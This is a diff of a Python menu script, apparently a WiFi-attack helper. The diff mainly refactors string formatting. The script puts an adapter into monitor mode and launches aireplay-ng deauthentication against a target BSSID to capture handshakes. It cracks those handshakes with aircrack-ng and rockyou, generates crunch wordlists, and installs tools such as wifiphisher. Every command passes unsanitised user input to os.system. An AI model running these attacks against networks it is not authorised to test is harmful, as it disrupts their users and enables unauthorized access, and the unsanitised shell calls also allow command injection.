@@ -1,6 +1,6 @@
 import os
 import time
-from functions import banner
+from functions import banner, is_crunch
 from termcolor import colored
 
 enter = "\n"
@@ -10,7 +10,7 @@ def menu():
 
     print(colored(f"{banner()}", "red"))
 
-    print("*** The Script was Created By TraiLeR (Idan) ***{0}".format(enter))
+    print(f"*** The Script was Created By TraiLeR (Idan) ***{enter}")
 
     print("""Menu:
     (1) Enable Monitor Mode
@@ -25,7 +25,7 @@ def menu():
     (10) About the Hacker
     (11) Exit""")
 
-    option = int(input("{0}Choice > ".format(enter)))
+    option = int(input(f"{enter}Choice > "))
 
     if option == 11:
         exit()
@@ -44,40 +44,45 @@ Feel free to reach me on Telegram:
         """)
 
     elif option == 1:
-        print("Set up the adapter{0}".format(enter))
+        os.system("clear")
+        print(f"Set up the adapter{enter}")
         adapter = input("Enter your adapter's name > ")
-        os.system("ifconfig {0} down && iwconfig {0} mode monitor && ifconfig {0} up && airmon-ng check kill".format(adapter))
+        os.system(f"ifconfig {adapter} down && iwconfig {adapter} mode monitor && ifconfig {adapter} up && airmon-ng check kill")
         menu()
 
     elif option == 2:
+        os.system("clear")
         adapter = input("Enter your adapter's name > ")
-        os.system("airmon-ng stop {0} && service network-manager restart".format(adapter))
+        os.system(f"ifconfig {adapter} down && iwconfig {adapter} mode managed && ifconfig {adapter} up")
         menu()
 
     elif option == 3:
+        os.system("clear")
         adapter = input("Enter your adapter's name > ")
-        scan = "airodump-ng {0} -M".format(adapter)
-        print("Press CTRL + C When you Finish the SCAN! *IMPORTANT* ")
+        scan = f"airodump-ng {adapter} -M"
+        print(colored("Press CTRL + C When you Finish the SCAN! *IMPORTANT*", "red"))
         time.sleep(5)
         os.system(scan)
         time.sleep(5)
         menu()
 
     elif option == 4:
+        os.system("clear")
         adapter = input("Enter your adapter's name > ")
-        scan = "airodump-ng {0} -M".format(adapter)
-        print("Press CTRL + C When you Finish the SCAN! *IMPORTANT* ")
+        scan = f"airodump-ng {adapter} -M"
+        print(colored("Press CTRL + C When you Finish the SCAN! *IMPORTANT*", "red"))
         time.sleep(5)
         os.system(scan)
-        bssid = str(input("\nEnter Target's BSSID > "))
-        channel = int(input("\nEnter Network's Channel > "))
-        path = str(input("\nEnter Network's Channel > "))
-        packet = int(input("Enter the number of packets > "))
-        attack = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}".format(adapter,bssid,channel,path,packet,bssid,adapter)
+        bssid = str(input(f"{enter}Enter Target's BSSID > "))
+        channel = int(input(f"{enter}Enter Network's Channel > "))
+        path = str(input(f"{enter}Where to save the Handshake > "))
+        packet = int(input("Enter the number of packets [30-100] > "))
+        attack = f"airodump-ng {adapter} --bssid {bssid} -c {channel} -w {path} | xterm -e aireplay-ng -0 {packet} -a {bssid} {adapter}"
         os.system(attack)
         menu()
 
     elif option == 5:
+        os.system("clear")
         os.system("sudo apt-get update && sudo apt-get full-upgrade -y")
         menu()
 
@@ -98,81 +103,94 @@ Feel free to reach me on Telegram:
 
         tool = int(input("Enter the number of the tool > "))
 
-        try:
-            if tool == 1:
-                os.system("sudo apt-get update && sudo apt-get install aircrack-ng -y")
+        if tool == 1:
+            os.system("sudo apt-get update && sudo apt-get install aircrack-ng -y")
 
-            elif tool == 2:
-                os.system("sudo apt-get update && sudo apt-get install wifite -y")
+        elif tool == 2:
+            os.system("sudo apt-get update && sudo apt-get install wifite -y")
 
-            elif tool == 3:
-                os.system("sudo apt-get update && sudo apt-get install kismet -y")
+        elif tool == 3:
+            os.system("sudo apt-get update && sudo apt-get install kismet -y")
 
-            elif tool == 4:
-                os.system("sudo apt-get update && sudo apt-get install wifiphisher -y")
+        elif tool == 4:
+            os.system("sudo apt-get update && sudo apt-get install wifiphisher -y")
 
-            elif tool == 5:
-                os.system("sudo apt-get update && sudo apt-get install linssid -y")
+        elif tool == 5:
+            os.system("sudo apt-get update && sudo apt-get install linssid -y")
 
-            elif tool == 6:
-                os.system("sudo apt-get update && sudo apt-get install wireshark -y")
+        elif tool == 6:
+            os.system("sudo apt-get update && sudo apt-get install wireshark -y")
 
-            elif tool == 7:
-                os.system("sudo apt-get update && sudo apt-get install airgeddon -y")
+        elif tool == 7:
+            os.system("sudo apt-get update && sudo apt-get install airgeddon -y")
 
-            elif tool == 8:
-                os.system("sudo apt-get update && sudo apt-get install wifitap")
+        elif tool == 8:
+            os.system("sudo apt-get update && sudo apt-get install wifitap")
 
-            elif tool == 9:
-                os.system("sudo apt-get update && sudo apt-get install -y crunch")
+        elif tool == 9:
+            os.system("sudo apt-get update && sudo apt-get install -y crunch")
 
-            elif tool == 10:
-                os.system("sudo apt-get update && sudo apt-get install -y aircrack-ng wifite kismet wifiphisher linssid wireshark airgeddon wifitap")
+        elif tool == 10:
+            os.system("sudo apt-get update && sudo apt-get install -y aircrack-ng wifite kismet wifiphisher linssid wireshark airgeddon wifitap")
 
-        except:
+        else:
             print("You did not type the right number on the list!")
 
     elif option == 7:
+        os.system("clear")
         if os.path.exists("/usr/share/wordlists/rockyou.txt"):
             handshake = str(input("Enter the path of the handshake file > "))
-            print("{0}To exit Press CTRL +C".format(enter))
-            os.system("aircrack-ng {0} -w /usr/share/wordlists/rockyou.txt".format(handshake))
+            print(f"{enter}To exit Press CTRL +C")
+            os.system(f"aircrack-ng {handshake} -w /usr/share/wordlists/rockyou.txt")
             time.sleep(5)
             exit()
 
-        elif not os.path.exists("/usr/share/wordlists/rockyou.txt"):
+        else:
             os.system("gzip -d /usr/share/wordlists/rockyou.txt.gz")
             handshake = str(input("Enter the path of the handshake file > "))
-            print("{0}To exit Press CTRL +C".format(enter))
-            os.system("aircrack-ng {0} -w /usr/share/wordlists/rockyou.txt".format(handshake))
+            print(f"{enter}To exit Press CTRL +C")
+            os.system(f"aircrack-ng {handshake} -w /usr/share/wordlists/rockyou.txt")
             time.sleep(5)
             exit()
 
     elif option == 8:
+        os.system("clear")
         handshake = str(input("Enter the path of the handshake file > "))
         wordlist = str(input("Enter the path of the wordlist file > "))
-        os.system("aircrack-ng {0} -w {1}".format(handshake, wordlist))
+        os.system(f"aircrack-ng {handshake} -w {wordlist}")
 
     elif option == 9:
+        os.system("clear")
         pattern = str(input("Would you like to create a wordlist with a pattern? [Y]es / [N]o > "))
         if pattern == "N":
-            if os.system("crunch") == "Usage":
-                print(colored("{0}The maximum and minimum length should be the same size as the pattern you specified!!{0}", "red").format(enter))
+            if is_crunch():
+                print(colored(f"{enter}The maximum and minimum length should be the same size as the pattern you specified!!{enter}", "red"))
 
                 min = int(input("Minimum of characters > "))
                 max = int(input("Maximum of characters > "))
                 characters = input("Characters > ")
-                pattern = input("Pattern (Example: a@@@@b) > ")
                 output = str(input("File Name (wordlist.txt) > "))
 
-                os.system("crunch {0} {1} {2} -o /root/Desktop{3} -t {4}".format(min, max, characters, output, pattern))
-                print("Your new wordlist saved in /root/Desktop{0}".format(output))
+                os.system(f"crunch {min} {max} {characters} -o /root/Desktop/{output}")
+                print(f"{enter}Your new wordlist saved in /root/Desktop/{output}")
 
-            elif not os.system("crunch") == "Usage":
-                print("Installing Crunch{0}".format(enter))
+            else:
+                print(f"Installing Crunch{enter}")
                 os.system("sudo apt-get update && sudo apt-get install -y crunch")
 
-                print(colored("{0}The maximum and minimum length should be the same size as the pattern you specified!!{0}", "red").format(enter))
+                print(colored(f"{enter}The maximum and minimum length should be the same size as the pattern you specified!!{enter}", "red"))
+
+                min = int(input("Minimum of characters > "))
+                max = int(input("Maximum of characters > "))
+                characters = input("Characters > ")
+                output = str(input("File Name (wordlist.txt) > "))
+
+                os.system(f"crunch {min} {max} {characters} -o /root/Desktop/{output}")
+                print(f"{enter}Your new wordlist saved in /root/Desktop/{output}")
+
+        elif pattern == "Y":
+            if is_crunch():
+                print(colored(f"{enter}The maximum and minimum length should be the same size as the pattern you specified!!{enter}", "red"))
 
                 min = int(input("Minimum of characters > "))
                 max = int(input("Maximum of characters > "))
@@ -180,20 +198,30 @@ Feel free to reach me on Telegram:
                 pattern = input("Pattern (Example: a@@@@b) > ")
                 output = str(input("File Name (wordlist.txt) > "))
 
-                os.system("crunch {0} {1} {2} -o /root/Desktop/{3} -t {4}".format(min, max, characters, output, pattern))
-                print("Your new wordlist saved in /root/Desktop/{0}".format(output))
+                os.system(f"crunch {min} {max} {characters} -o /root/Desktop/{output} -t {pattern}")
+                print(f"{enter}Your new wordlist saved in /root/Desktop/{output}")
 
-        elif pattern == "Y":
-            if os.system("crunch") == "Usage":
-                print(colored("{0}The maximum and minimum length should be the same size as the pattern you specified!!{0}", "red").format(enter))
+            else:
+                print(f"Installing Crunch{enter}")
+                os.system("sudo apt-get update && sudo apt-get install -y crunch")
+
+                print(colored(f"{enter}The maximum and minimum length should be the same size as the pattern you specified!!{enter}", "red"))
 
                 min = int(input("Minimum of characters > "))
                 max = int(input("Maximum of characters > "))
                 characters = input("Characters > ")
+                pattern = input("Pattern (Example: a@@@@b) > ")
                 output = str(input("File Name (wordlist.txt) > "))
 
-                os.system("crunch {0} {1} {2} -o {3}".format(min, max, characters, output))
-                print("{0}Your new wordlist saved in /root/Desktop/{1}".format(enter, output))
+                os.system(f"crunch {min} {max} {characters} -o /root/Desktop/{output} -t {pattern}")
+                print(f"{enter}Your new wordlist saved in /root/Desktop/{output}")
+
+        else:
+            print("Type [Y]es / [N]o !")
+            exit()
+
+    else:
+        print("Please type the number from the list!")
 
 
 menu()
